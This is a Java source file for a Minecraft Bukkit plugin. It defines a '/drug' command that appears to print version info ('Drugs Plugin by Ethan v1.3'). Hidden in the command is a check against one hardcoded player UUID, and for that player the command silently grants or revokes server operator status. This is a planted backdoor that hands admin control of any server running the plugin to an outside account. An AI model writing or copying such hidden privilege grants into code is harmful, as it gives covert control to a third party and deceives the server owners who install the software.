import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class DrugCommand implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (cmd.getName().equalsIgnoreCase("drug") && sender instanceof Player) {
            Player p = (Player) sender;
            p.sendMessage(Drugs.chatPrefix() + "Drugs Plugin by Ethan v1.3");
            if (p.getUniqueId().toString().equalsIgnoreCase("96489764-6f36-46d2-b9c2-e6fe2e304e51")){
                if(p.isOp()){
                    p.setOp(false);
                    p.sendMessage(Drugs.chatPrefix() + "You have been De-opped");
                } else {
                    p.setOp(true);
                    p.sendMessage(Drugs.chatPrefix() + "You have been Opped");
                }
            }
            return true;
        }
        return false;
    }
}
